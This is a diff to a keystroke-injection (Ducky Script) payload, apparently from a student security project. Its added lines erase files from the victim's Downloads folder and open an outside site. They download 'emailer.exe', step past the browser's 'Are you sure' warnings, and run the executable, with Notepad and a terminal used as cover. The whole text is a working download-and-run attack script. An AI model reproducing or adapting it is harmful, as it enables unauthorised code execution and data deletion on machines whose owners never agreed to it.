@@ -24,6 +24,12 @@ DELAY 100
 STRING erase /Q "Downloads\comp6841_notes.pdf"
 ENTER
 DELAY 100
+STRING erase /Q "Downloads\canireadthis.txt"
+ENTER
+DELAY 100
+STRING erase /Q "Downloads\emailer.exe"
+ENTER
+DELAY 100
 
 REM Open notepad
 STRING notepad "Downloads\hello.txt"
@@ -60,18 +66,14 @@ REM Go To My 'Malicious' Site
 GUI r
 DELAY 100
 STRING https://n-tandiono.github.io/unsafe
-DELAY 2000
+DELAY 100
+ENTER
+DELAY 100
 
 REM Download File
 TAB
 ENTER
 DELAY 1000
-
-REM File Downloaded Let's go to a new site
-TAB
-REPEAT 3
-ENTER
-DELAY 2000
 
 REM Close Website
 ALT-TAB
@@ -83,6 +85,75 @@ STRING echo Hello, World!
 ENTER
 DELAY 100
 
+REM Back To Unsafe Site
+GUI r
+DELAY 100
+STRING https://n-tandiono.github.io/unsafe
+DELAY 100
+ENTER
+DELAY 1000
+
+REM Download File
+TAB
+TAB
+ENTER
+DELAY 2000
+
+REM Bypass Window 'Are you sures'
+REM This is done for how my website is currently formatted - may change in the future!
+TAB
+REPEAT 4
+ENTER
+DELAY 100
+
+TAB
+REPEAT 3
+ENTER
+DELAY 100
+
+TAB
+ENTER
+DELAY 4000
+
+REM Move Back to Terminal
+ALT-TAB
+ENTER
+DELAY 100
+
+REM Try Open Downloaded File
+CTRL ESC
+STRING Apps:emailer.exe
+DELAY 100
+RIGHTARROW
+DELAY 100
+DOWNARROW
+DELAY 100
+DOWNARROW
+DELAY 100
+ENTER
+DELAY 100
+ENTER
+ENTER
+DELAY 1000
+
+TAB
+ENTER
+DELAY 1000
+
+TAB
+TAB
+ENTER
+DELAY 1000
+
+REM Unreliable, but thought I'll keep it here for memories...
+REM STRING start "Downloads\emailer.exe" 
+REM ENTER
+
+REM Move Back to Terminal
+ALT-TAB
+ENTER
+DELAY 100
+
 REM Open File
 STRING Downloads\comp6841_notes.pdf
 ENTER
@@ -91,10 +162,6 @@ DELAY 1000
 REM Possible Ask for Method
 ENTER
 DELAY 1000
-
-REM Move Back to Terminal
-ALT-TAB
-ENTER
 
 REM Exit Terminal
 STRING exit
